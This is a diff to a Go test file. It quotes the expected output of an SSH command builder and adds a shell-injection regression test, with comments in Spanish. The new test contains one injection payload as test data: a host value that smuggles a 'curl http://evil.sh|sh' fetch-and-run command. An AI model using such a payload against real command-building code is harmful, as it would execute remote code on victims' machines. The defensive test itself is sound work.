@@ -22,7 +22,7 @@ func TestBuildSSHCommand(t *testing.T) {
 			port:       22,
 			key:        "~/.ssh/id_rsa",
 			wantPrefix: "ssh -o StrictHostKeyChecking=accept-new",
-			wantSubstr: "-i ~/.ssh/id_rsa root@108.61.33.61",
+			wantSubstr: "-i '~/.ssh/id_rsa' 'root@108.61.33.61'",
 		},
 		{
 			name:       "Custom port and user",
@@ -31,7 +31,7 @@ func TestBuildSSHCommand(t *testing.T) {
 			port:       2222,
 			key:        "/path/to/key.pem",
 			wantPrefix: "ssh -o StrictHostKeyChecking=accept-new",
-			wantSubstr: "-p 2222 ubuntu@staging.example.com",
+			wantSubstr: "-p 2222 'ubuntu@staging.example.com'",
 		},
 		{
 			name:       "Empty user defaults to root",
@@ -57,10 +57,22 @@ func TestBuildSSHCommand(t *testing.T) {
 	}
 }
 
+// TestBuildSSHCommand_ShellInjectionPrevention valida el flujo completo: un host o
+// llave privada guardados con metacaracteres de shell no deben poder ejecutar comandos
+// adicionales cuando OpenNativeTerminal corre el resultado en una terminal real.
+func TestBuildSSHCommand_ShellInjectionPrevention(t *testing.T) {
+	evilHost := "1.2.3.4; curl http://evil.sh|sh #"
+	got := BuildSSHCommand("root", evilHost, 22, "")
+
+	want := "ssh -o StrictHostKeyChecking=accept-new 'root@" + evilHost + "'"
+	if got != want {
+		t.Errorf("comando inseguro:\n got:  %s\n want: %s", got, want)
+	}
+}
+
 func TestOpenBrowserInvalidURL(t *testing.T) {
 	err := OpenBrowser("ftp://invalid-scheme.com")
 	if err == nil {
 		t.Error("OpenBrowser with ftp scheme should return error")
 	}
 }
-
